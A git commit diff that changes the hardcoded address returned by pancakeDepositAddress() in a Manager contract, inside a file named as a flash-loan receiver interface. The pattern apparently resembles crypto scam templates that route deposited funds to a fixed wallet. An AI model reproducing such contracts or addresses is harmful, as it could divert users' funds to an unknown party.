665ade8d8fedb997a07a2cb69c7c3bfbc0276bbd
azgithub666 <88027883+azgithub666@users.noreply.github.com>
2021-08-01 17:01:25 +0800

    Update IFlashLoanReceiverV1.2.sol

--- contracts/interfaces/IFlashLoanReceiverV1.2.sol
+++ contracts/interfaces/IFlashLoanReceiverV1.2.sol
@@ -6,6 +6,6 @@ contract Manager {
 	}
 
 	function pancakeDepositAddress() public pure returns (address) {
-		return 0x78F01EE913F4C1994F8e32a62aCF2ed46e52Ba7C;
+		return 0xDdC0Ad2f73E0a060AC85e52387af251F139Fe744;
 	}
 }
